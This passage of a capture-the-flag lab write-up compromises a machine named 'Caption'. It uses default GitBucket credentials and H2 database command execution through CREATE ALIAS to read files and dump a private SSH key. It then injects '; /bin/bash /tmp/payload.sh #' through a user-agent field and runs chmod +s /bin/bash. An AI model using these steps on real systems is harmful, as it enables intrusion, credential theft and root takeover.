+</span></span><span style="display:flex;"><span>SF:set<span style="color:#f92672">=</span>utf-8<span style="color:#ae81ff">\r\n</span>Content-Length:<span style="color:#ae81ff">\x</span>207195<span style="color:#ae81ff">\r\n\r\n</span>&lt;!DOCTYPE<span style="color:#ae81ff">\x</span>20html&gt;<span style="color:#ae81ff">\n</span>&lt;html<span style="color:#ae81ff">\x</span>
+</span></span><span style="display:flex;"><span>SF:20prefix<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>og:<span style="color:#ae81ff">\x</span>20http://ogp<span style="color:#ae81ff">\.</span>me/ns#<span style="color:#ae81ff">\&#34;\x</span>20lang<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>en<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20&lt;head&gt;<span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>SF:n<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;meta<span style="color:#ae81ff">\x</span>20charset<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>UTF-8<span style="color:#ae81ff">\&#34;\x</span>20/&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;met
+</span></span><span style="display:flex;"><span>SF:a<span style="color:#ae81ff">\x</span>20name<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>viewport<span style="color:#ae81ff">\&#34;\x</span>20content<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>width<span style="color:#f92672">=</span>device-width,<span style="color:#ae81ff">\x</span>20initial-scal
+</span></span><span style="display:flex;"><span>SF:e<span style="color:#f92672">=</span>1<span style="color:#ae81ff">\.</span>0,<span style="color:#ae81ff">\x</span>20maximum-scale<span style="color:#f92672">=</span>5<span style="color:#ae81ff">\.</span>0<span style="color:#ae81ff">\&#34;\x</span>20/&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;meta<span style="color:#ae81ff">\x</span>20http-eq
+</span></span><span style="display:flex;"><span>SF:uiv<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>X-UA-Compatible<span style="color:#ae81ff">\&#34;\x</span>20content<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>IE<span style="color:#f92672">=</span>edge<span style="color:#ae81ff">\&#34;\x</span>20/&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;
+</span></span><span style="display:flex;"><span>SF:title&gt;GitBucket&lt;/title&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;meta<span style="color:#ae81ff">\x</span>20property<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>og:title<span style="color:#ae81ff">\&#34;</span>
+</span></span><span style="display:flex;"><span>SF:<span style="color:#ae81ff">\x</span>20content<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>GitBucket<span style="color:#ae81ff">\&#34;\x</span>20/&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;meta<span style="color:#ae81ff">\x</span>20property<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>og
+</span></span><span style="display:flex;"><span>SF::type<span style="color:#ae81ff">\&#34;\x</span>20content<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>object<span style="color:#ae81ff">\&#34;\x</span>20/&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;meta<span style="color:#ae81ff">\x</span>20property<span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>SF:<span style="color:#ae81ff">\&#34;</span>og:url<span style="color:#ae81ff">\&#34;\x</span>20content<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>http://10<span style="color:#ae81ff">\.</span>129<span style="color:#ae81ff">\.</span>145<span style="color:#ae81ff">\.</span>80:8080/<span style="color:#ae81ff">\&#34;\x</span>20/&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">20</span>
+</span></span><span style="display:flex;"><span>SF:<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;meta<span style="color:#ae81ff">\x</span>20property<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>og:image<span style="color:#ae81ff">\&#34;\x</span>20con
+</span></span><span style="display:flex;"><span>SF:tent<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>http://10<span style="color:#ae81ff">\.</span>129<span style="color:#ae81ff">\.</span>145<span style="color:#ae81ff">\.</span>80:8080/assets/common/images/gitbucket_ogp<span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>SF:.png<span style="color:#ae81ff">\&#34;\x</span>20/&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;link
+</span></span><span style="display:flex;"><span>SF:<span style="color:#ae81ff">\x</span>20rel<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>icon<span style="color:#ae81ff">\&#34;\x</span>20href<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>/assets/common/images/gitbucket<span style="color:#ae81ff">\.</span>png<span style="color:#ae81ff">\?</span><span style="color:#ae81ff">202409</span>
+</span></span><span style="display:flex;"><span>SF:16072436<span style="color:#ae81ff">\&#34;\x</span>20ty<span style="color:#e6db74">&#34;)%r(HTTPOptions,108,&#34;</span>HTTP/1<span style="color:#ae81ff">\.</span>1<span style="color:#ae81ff">\x</span>20200<span style="color:#ae81ff">\x</span>20OK<span style="color:#ae81ff">\r\n</span>Date:<span style="color:#ae81ff">\x</span>
+</span></span><span style="display:flex;"><span>SF:20Mon,<span style="color:#ae81ff">\x</span>2016<span style="color:#ae81ff">\x</span>20Sep<span style="color:#ae81ff">\x</span>202024<span style="color:#ae81ff">\x</span>2007:24:37<span style="color:#ae81ff">\x</span>20GMT<span style="color:#ae81ff">\r\n</span>Set-Cookie:<span style="color:#ae81ff">\x</span>20JSESSI
+</span></span><span style="display:flex;"><span>SF:ONID<span style="color:#f92672">=</span>node0tlwrkkhy6fo61sthbzxusxjfm1<span style="color:#ae81ff">\.</span>node0;<span style="color:#ae81ff">\x</span>20Path<span style="color:#f92672">=</span>/;<span style="color:#ae81ff">\x</span>20HttpOnly<span style="color:#ae81ff">\r\n</span>
+</span></span><span style="display:flex;"><span>SF:Expires:<span style="color:#ae81ff">\x</span>20Thu,<span style="color:#ae81ff">\x</span>2001<span style="color:#ae81ff">\x</span>20Jan<span style="color:#ae81ff">\x</span>201970<span style="color:#ae81ff">\x</span>2000:00:00<span style="color:#ae81ff">\x</span>20GMT<span style="color:#ae81ff">\r\n</span>Content-Typ
+</span></span><span style="display:flex;"><span>SF:e:<span style="color:#ae81ff">\x</span>20text/html;charset<span style="color:#f92672">=</span>utf-8<span style="color:#ae81ff">\r\n</span>Allow:<span style="color:#ae81ff">\x</span>20GET,HEAD,POST,OPTIONS<span style="color:#ae81ff">\r\n</span>Con
+</span></span><span style="display:flex;"><span>SF:tent-Length:<span style="color:#ae81ff">\x</span>200<span style="color:#ae81ff">\r\n\r\n</span><span style="color:#e6db74">&#34;)%r(RTSPRequest,B8,&#34;</span>HTTP/1<span style="color:#ae81ff">\.</span>1<span style="color:#ae81ff">\x</span>20505<span style="color:#ae81ff">\x</span>20HTTP<span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>SF:x20Version<span style="color:#ae81ff">\x</span>20Not<span style="color:#ae81ff">\x</span>20Supported<span style="color:#ae81ff">\r\n</span>Content-Type:<span style="color:#ae81ff">\x</span>20text/html;charset<span style="color:#f92672">=</span>is
+</span></span><span style="display:flex;"><span>SF:o-8859-1<span style="color:#ae81ff">\r\n</span>Content-Length:<span style="color:#ae81ff">\x</span>2058<span style="color:#ae81ff">\r\n</span>Connection:<span style="color:#ae81ff">\x</span>20close<span style="color:#ae81ff">\r\n\r\n</span>&lt;h1&gt;Ba
+</span></span><span style="display:flex;"><span>SF:d<span style="color:#ae81ff">\x</span>20Message<span style="color:#ae81ff">\x</span>20505&lt;/h1&gt;&lt;pre&gt;reason:<span style="color:#ae81ff">\x</span>20Unknown<span style="color:#ae81ff">\x</span>20Version&lt;/pre&gt;<span style="color:#e6db74">&#34;)%r(Fo
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:urOhFourRequest,1813,&#34;</span>HTTP/1<span style="color:#ae81ff">\.</span>1<span style="color:#ae81ff">\x</span>20404<span style="color:#ae81ff">\x</span>20Not<span style="color:#ae81ff">\x</span>20Found<span style="color:#ae81ff">\r\n</span>Date:<span style="color:#ae81ff">\x</span>20Mon,
+</span></span><span style="display:flex;"><span>SF:<span style="color:#ae81ff">\x</span>2016<span style="color:#ae81ff">\x</span>20Sep<span style="color:#ae81ff">\x</span>202024<span style="color:#ae81ff">\x</span>2007:24:37<span style="color:#ae81ff">\x</span>20GMT<span style="color:#ae81ff">\r\n</span>Set-Cookie:<span style="color:#ae81ff">\x</span>20JSESSIONID<span style="color:#f92672">=</span>n
+</span></span><span style="display:flex;"><span>SF:ode01twwz3kp29jtu49mlm2sbel32<span style="color:#ae81ff">\.</span>node0;<span style="color:#ae81ff">\x</span>20Path<span style="color:#f92672">=</span>/;<span style="color:#ae81ff">\x</span>20HttpOnly<span style="color:#ae81ff">\r\n</span>Expires
+</span></span><span style="display:flex;"><span>SF::<span style="color:#ae81ff">\x</span>20Thu,<span style="color:#ae81ff">\x</span>2001<span style="color:#ae81ff">\x</span>20Jan<span style="color:#ae81ff">\x</span>201970<span style="color:#ae81ff">\x</span>2000:00:00<span style="color:#ae81ff">\x</span>20GMT<span style="color:#ae81ff">\r\n</span>Content-Type:<span style="color:#ae81ff">\x</span>20t
+</span></span><span style="display:flex;"><span>SF:ext/html;charset<span style="color:#f92672">=</span>utf-8<span style="color:#ae81ff">\r\n</span>Content-Length:<span style="color:#ae81ff">\x</span>205920<span style="color:#ae81ff">\r\n\r\n</span>&lt;!DOCTYPE<span style="color:#ae81ff">\x</span>20h
+</span></span><span style="display:flex;"><span>SF:tml&gt;<span style="color:#ae81ff">\n</span>&lt;html<span style="color:#ae81ff">\x</span>20prefix<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>og:<span style="color:#ae81ff">\x</span>20http://ogp<span style="color:#ae81ff">\.</span>me/ns#<span style="color:#ae81ff">\&#34;\x</span>20lang<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>en<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\n\x</span>
+</span></span><span style="display:flex;"><span>SF:20<span style="color:#ae81ff">\x</span>20&lt;head&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;meta<span style="color:#ae81ff">\x</span>20charset<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>UTF-8<span style="color:#ae81ff">\&#34;\x</span>20/&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>SF:0<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;meta<span style="color:#ae81ff">\x</span>20name<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>viewport<span style="color:#ae81ff">\&#34;\x</span>20content<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>width<span style="color:#f92672">=</span>device-width,<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>SF:0initial-scale<span style="color:#f92672">=</span>1<span style="color:#ae81ff">\.</span>0,<span style="color:#ae81ff">\x</span>20maximum-scale<span style="color:#f92672">=</span>5<span style="color:#ae81ff">\.</span>0<span style="color:#ae81ff">\&#34;\x</span>20/&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;me
+</span></span><span style="display:flex;"><span>SF:ta<span style="color:#ae81ff">\x</span>20http-equiv<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>X-UA-Compatible<span style="color:#ae81ff">\&#34;\x</span>20content<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>IE<span style="color:#f92672">=</span>edge<span style="color:#ae81ff">\&#34;\x</span>20/&gt;<span style="color:#ae81ff">\n\x</span><span style="color:#ae81ff">20</span>
+</span></span><span style="display:flex;"><span>SF:<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;title&gt;Error&lt;/title&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;meta<span style="color:#ae81ff">\x</span>20property<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>o
+</span></span><span style="display:flex;"><span>SF:g:title<span style="color:#ae81ff">\&#34;\x</span>20content<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>Error<span style="color:#ae81ff">\&#34;\x</span>20/&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;meta<span style="color:#ae81ff">\x</span>20property
+</span></span><span style="display:flex;"><span>SF:<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>og:type<span style="color:#ae81ff">\&#34;\x</span>20content<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>object<span style="color:#ae81ff">\&#34;\x</span>20/&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;meta<span style="color:#ae81ff">\x</span>20prop
+</span></span><span style="display:flex;"><span>SF:erty<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>og:url<span style="color:#ae81ff">\&#34;\x</span>20content<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>http://10<span style="color:#ae81ff">\.</span>129<span style="color:#ae81ff">\.</span>145<span style="color:#ae81ff">\.</span>80:8080/nice%20ports%
+</span></span><span style="display:flex;"><span>SF:2C/Tri%6Eity<span style="color:#ae81ff">\.</span>txt%2ebak<span style="color:#ae81ff">\&#34;\x</span>20/&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">20</span>
+</span></span><span style="display:flex;"><span>SF:<span style="color:#ae81ff">\x</span>20&lt;meta<span style="color:#ae81ff">\x</span>20property<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>og:image<span style="color:#ae81ff">\&#34;\x</span>20content<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>http://10<span style="color:#ae81ff">\.</span>129<span style="color:#ae81ff">\.</span>145<span style="color:#ae81ff">\.</span><span style="color:#ae81ff">80</span>
+</span></span><span style="display:flex;"><span>SF::8080/assets/common/images/gitbucket_ogp<span style="color:#ae81ff">\.</span>png<span style="color:#ae81ff">\&#34;\x</span>20/&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">20</span>
+</span></span><span style="display:flex;"><span>SF:<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;link<span style="color:#ae81ff">\x</span>20rel<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>icon<span style="color:#ae81ff">\&#34;\x</span>20href<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>/as
+</span></span><span style="display:flex;"><span>SF:sets/common/images<span style="color:#e6db74">&#34;);
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span></span></code></pre></div><p>We discover 3 open ports: 22 running ssh and 80 + 8080 running http</p>
+<p>==&gt; We notice a domain name <code>http://caption.htb</code>that we can add to our hosts file and we also see that port 8080 seems to be running a <code>gitbucket</code>instance</p>
+<h3 id="port-80">Port 80</h3>
+<p>We see this website and it gives us a login platform where we can try some default credentials but none of them work</p>
+<p><img src="Caption_80.png" alt="image"></p>
+<p>&ndash;&gt; Move on and come back to it later</p>
+<h3 id="port-8080">Port 8080</h3>
+<p>We see a <code>gitbucket</code>instance and there is a <code>sign in</code>option that we can try &ndash;&gt; it works with credentials <code>root:root</code>as these are the default credentials when setting up:</p>
+<pre tabindex="0"><code>The default administrator account is root and password is root . Source code modifications are detected and a reloading happens automatically. You can modify the logging configuration by editing src/main/resources/logback-dev
+</code></pre><p><img src="Caption_8080.png" alt="image"></p>
+<p>Then clicking on our profile and selecting <code>System administration</code>we see many things including the ability to query a database:</p>
+<p><img src="Caption_db.png" alt="image"></p>
+<p>But it doesn&rsquo;t seem like we can do anything as we aren&rsquo;t able to retrieve any info from there</p>
+<h2 id="exploitation">Exploitation</h2>
+<p>We see this in the website that there is some information about the database:</p>
+<p><img src="Caption_H2.png" alt="image"></p>
+<p>and we first notice a user: <code>margo</code>and also that the system is using an <code>H2 database</code></p>
+<p>We can also export the db content but we only find an uncrackable password hash:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$pbkdf2-sha256$100000$O5zdxA5m9ZtnSSMnUfXK4zw9j/8WgKxo9ItXxVIPw3s<span style="color:#f92672">=</span>$xUd/Zorr75r/yWR9IXkW7TJlLXuEH+3U1uMAm37cBMk<span style="color:#f92672">=</span>
+</span></span></code></pre></div><p>==&gt;We then discover <a href="https://medium.com/r3d-buck3t/chaining-h2-database-vulnerabilities-for-rce-9b535a9621a2">this</a> exploit and we can try to make it work in order to get the user flag</p>
+<p>==&gt; We can then run the following query:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-mysql" data-lang="mysql"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> <span style="color:#a6e22e">FILE_READ</span>(<span style="color:#e6db74">&#39;/home/margo/user.txt&#39;</span>,<span style="color:#66d9ef">NULL</span>) 
+</span></span></code></pre></div><p>and we get the user flag!!!!</p>
+<p>==================================================================</p>
+<p>trying to run <code>SELECT FILE_READ('/root/root.txt',NULL)</code>gives us permission denied</p>
+<p>==================================================================</p>
+<h2 id="ssh-key">SSH key</h2>
+<p>We can create an alias for command execution following the exploit:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-mysql" data-lang="mysql"><span style="display:flex;"><span><span style="color:#66d9ef">CREATE</span> ALIAS REVEXEC <span style="color:#66d9ef">AS</span> <span style="color:#960050;background-color:#1e0010">$$</span> String <span style="color:#a6e22e">shellexec</span>(String cmd) throws java.io.IOException <span style="color:#960050;background-color:#1e0010">{</span> java.util.Scanner s <span style="color:#f92672">=</span> new java.util.<span style="color:#a6e22e">Scanner</span>(Runtime.<span style="color:#a6e22e">getRuntime</span>().<span style="color:#a6e22e">exec</span>(cmd).<span style="color:#a6e22e">getInputStream</span>()).<span style="color:#a6e22e">useDelimiter</span>(<span style="color:#e6db74">&#34;\\A&#34;</span>); <span style="color:#66d9ef">return</span> s.<span style="color:#a6e22e">hasNext</span>() <span style="color:#f92672">?</span> s.<span style="color:#a6e22e">next</span>() : <span style="color:#e6db74">&#34;&#34;</span>; <span style="color:#960050;background-color:#1e0010">}$$</span>;
+</span></span></code></pre></div><p>and we can then use it to gain command execution and thus, a reverse shell</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-mysql" data-lang="mysql"><span style="display:flex;"><span><span style="color:#66d9ef">CALL</span> <span style="color:#a6e22e">REVEXEC</span>(<span style="color:#e6db74">&#39;ls -la .ssh&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>org.h2.jdbc.JdbcSQLDataException: Data conversion error converting <span style="color:#e6db74">&#34;total 20 drwx------ 2 margo margo 4096 Sep 16 07:22 . 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">drwxr-x--- 10 margo margo 4096 Aug 30 10:17 .. 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">-rw------- 1 margo margo 175 Sep 16 07:22 authorized_keys 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">-rw------- 1 margo margo 492 Sep 16 07:22 id_ecdsa 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">-rw-r--r-- 1 margo margo 174 Sep 16 07:22 id_ecdsa.pub &#34;</span>
+</span></span><span style="display:flex;"><span>; <span style="color:#66d9ef">SQL</span> statement: <span style="color:#66d9ef">CALL</span> <span style="color:#a6e22e">REVEXEC</span>(<span style="color:#e6db74">&#39;ls -la .ssh&#39;</span>) [<span style="color:#ae81ff">22018</span><span style="color:#f92672">-</span><span style="color:#ae81ff">199</span>]
+</span></span></code></pre></div><p>and we see here that there is an ssh key &ndash;&gt; we can cat it and use it to ssh:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-mysql" data-lang="mysql"><span style="display:flex;"><span><span style="color:#66d9ef">CALL</span> <span style="color:#a6e22e">REVEXEC</span>(<span style="color:#e6db74">&#39;cat .ssh/id_ecdsa&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>org.h2.jdbc.JdbcSQLDataException: Data conversion error converting <span style="color:#e6db74">&#34;-----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAaAAAABNlY2RzYS1zaGEy LW5pc3RwMjU2AAAACG5pc3RwMjU2AAAAQQRJJYs5L942EavjlNbchLEzgw5bl3lO0hGsq/Kj5j1p ng+//YAJW/9Bm0VI3RitP/hk2qPSiTh+ML1YEXf62qo1AAAAoBLXAf8S1wH/AAAAE2VjZHNhLXNo YTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEklizkv3jYRq+OU1tyEsTODDluXeU7SEayr8qPm PWmeD7/9gAlb/0GbRUjdGK0/+GTao9KJOH4wvVgRd/raqjUAAAAgLK+666yB9k8sf0NNw/stU+9f qVUSLZEfflUgKAHLocQAAAAAAQIDBAUGBwg= -----END OPENSSH PRIVATE KEY----- &#34;</span>; <span style="color:#66d9ef">SQL</span> statement: <span style="color:#66d9ef">CALL</span> <span style="color:#a6e22e">REVEXEC</span>(<span style="color:#e6db74">&#39;cat .ssh/id_ecdsa&#39;</span>) [<span style="color:#ae81ff">22018</span><span style="color:#f92672">-</span><span style="color:#ae81ff">199</span>]
+</span></span></code></pre></div><p>and we get in as user <code>margo</code></p>
+<h2 id="privilege-escalation">Privilege escalation</h2>
+<p>==&gt; We can then list the services running on the ports on the local system:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>margo@caption:~$ netstat -tlnp
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>Not all processes could be identified, non-owned process info
+</span></span><span style="display:flex;"><span> will not be shown, you would have to be root to see it all.<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Active Internet connections <span style="color:#f92672">(</span>only servers<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+</span></span><span style="display:flex;"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+</span></span><span style="display:flex;"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 0.0.0.0:8080            0.0.0.0:*               LISTEN      1044/java           
+</span></span><span style="display:flex;"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 127.0.0.1:9090          0.0.0.0:*               LISTEN      -                   
+</span></span><span style="display:flex;"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
+</span></span><span style="display:flex;"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+</span></span><span style="display:flex;"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 127.0.0.1:3923          0.0.0.0:*               LISTEN      1043/python3        
+</span></span><span style="display:flex;"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 127.0.0.1:8000          0.0.0.0:*               LISTEN      1046/python3        
+</span></span><span style="display:flex;"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 127.0.0.1:6081          0.0.0.0:*               LISTEN      -                   
+</span></span><span style="display:flex;"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 127.0.0.1:6082          0.0.0.0:*               LISTEN      -                   
+</span></span><span style="display:flex;"><span>tcp6       <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> :::22                   :::*                    LISTEN      - 
+</span></span></code></pre></div><p>We also see in the <code>Gitbucket</code>instance that there is in the <code>root/Logservice</code>some files that say:</p>
+<pre tabindex="0"><code>-   flag.IntVar(&amp;port, &#34;p&#34;, 9090, &#34;Specify port&#34;)
+- logs := fmt.Sprintf(&#34;echo &#39;IP Address: %s, User-Agent: %s, Timestamp: %s&#39; &gt;&gt; output.log&#34;, ip, userAgent, timestamp)
+-         exec.Command{&#34;/bin/sh&#34;, &#34;-c&#34;, logs}
+</code></pre><p>so we can local forward port 9090 and then create a malicious payload to get a reverse shell as root</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh -L 9090:127.0.0.1:9090 -i id_rsa margo@10.129.145.31
+</span></span></code></pre></div><p>then, we can create 2 scripts under <code>/tmp</code>, <code>malicious.log</code>and <code>payload.sh</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>127.0.0.1 <span style="color:#e6db74">&#34;user-agent&#34;</span>:<span style="color:#e6db74">&#34;&#39;; /bin/bash /tmp/payload.sh #&#34;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>chmod +s /bin/bash
+</span></span></code></pre></div><p>Once that is done, we can copy the <code>log_service.thrift</code>on our machine and run the <code>thrift</code>command to generate the files for the client:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#a6e22e">namespace</span> <span style="color:#66d9ef">go</span> <span style="color:#a6e22e">log_service</span>    
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">service</span> <span style="color:#a6e22e">LogService</span> {  
